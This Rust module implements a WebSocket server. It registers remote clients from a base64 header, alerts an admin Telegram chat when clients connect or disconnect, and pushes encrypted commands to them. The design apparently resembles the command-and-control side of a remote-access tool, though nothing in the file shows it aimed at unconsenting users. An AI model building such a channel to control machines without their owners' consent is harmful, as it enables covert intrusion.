pub mod websockets {
    use futures_util::{SinkExt, StreamExt};
    use std::net::SocketAddr;
    use std::sync::Arc;
    use std::time::Duration;
    use tokio::sync::{mpsc, Mutex};
    use axum::extract::{ConnectInfo, Query, State, WebSocketUpgrade};
    use axum::extract::ws::{Message, WebSocket};
    use axum::http::HeaderMap;
    use axum::response::Response;
    use base64::Engine;
    use base64::prelude::BASE64_STANDARD;
    use log::{error, info};
    use serde::Deserialize;
    use teloxide::requests::Requester;
    use teloxide::types::ChatId;
    use tokio::time;
    
    use crate::app::app::{AppState, HelloData, RPTClient};
    use crate::core::command::command::RPTCommand;
    use crate::core::utils::utils::encrypt_data;

    use rust_i18n::t;

    pub async fn handler(ws: WebSocketUpgrade, ConnectInfo(addr): ConnectInfo<SocketAddr>, State(app_state): State<Arc<Mutex<AppState>>>, header_map: HeaderMap) -> Response {
        ws.on_upgrade(move |socket| handle_socket(socket, addr, app_state, header_map))
    }

    async fn handle_socket(socket: WebSocket, who: SocketAddr, state: Arc<Mutex<AppState>>, header_map: HeaderMap) {
        let header = header_map.get("X-Client-Info").unwrap().to_str().unwrap();
        let decode = BASE64_STANDARD.decode(header).unwrap_or_default();
        let data: HelloData = serde_json::from_slice(decode.as_slice()).unwrap();

        // Informing about new user
        info!("New user connected: {}", data.ip);

        // channel for client 
        let (tx, mut rx) = mpsc::channel::<RPTCommand>(10);
        {
            let mut state = state.lock().await;
            let _ = state.bot.send_message(ChatId(state.config.telegram.admin_chat_id), t!("client.connected", "client" => data.ip)).await;
            let mut client = RPTClient::new(data.clone());
            client.channel = Some(tx);
            state.clients.push(client);
        }

        let ping = {
            let state = state.lock().await;
            state.config.server.ping_interval
        };

        let mut ping_interval = time::interval(Duration::from_secs(ping as u64));

        let (mut sender, mut receiver) = socket.split();
        loop {
            tokio::select! {
                msg = rx.recv() => {
                    // encoding message
                    let secure_data_key = {
                        let state = state.lock().await;
                        state.config.server.data_secure_key.clone()
                    };

                    let json_ = serde_json::to_string(&msg.clone().unwrap()).unwrap();
                    let r_msg = json_.as_bytes();
                    let crypted_msg = encrypt_data(r_msg, secure_data_key.as_bytes());

                    info!("Sending command({:?}) to client({})", &msg.unwrap().rpt_type, data.ip);

                    if let Err(e) = sender.send(Message::from(crypted_msg)).await {
                        error!("Failed to send message to client: {}", e);
                        break;
                    }
                }

                msg = receiver.next() => {
                    match msg {
                        Some(Ok(m)) => {
                            match m {
                                Message::Text(_) => {
                                    info!("Message received from server");
                                }
                            _ => {}}
                        }
                        Some(Err(e)) => {
                            error!("Socket connection error: {}", e);
                            break;
                        }
                        _ => {break;}
                    }
                }

                _ = ping_interval.tick() => {
                    if let Err(e) = sender.send(Message::Ping(vec![].into())).await {
                        error!("Ping failed: {}", e);
                        break;
                    }
                }
            }
        }

        // if loop breaks
        {
            let mut state = state.lock().await;

            let index = state.clients.iter().position(|x| x.address == who.ip().to_string());
            if let Some(index) = index {
                state.clients.remove(index);
            }
            let _ = state.bot.send_message(
                ChatId(state.config.telegram.admin_chat_id),
                t!("client.disconnected", "client" => data.ip)
            ).await;
        }
        info!("User disconnected from network: {}", who);
    }
}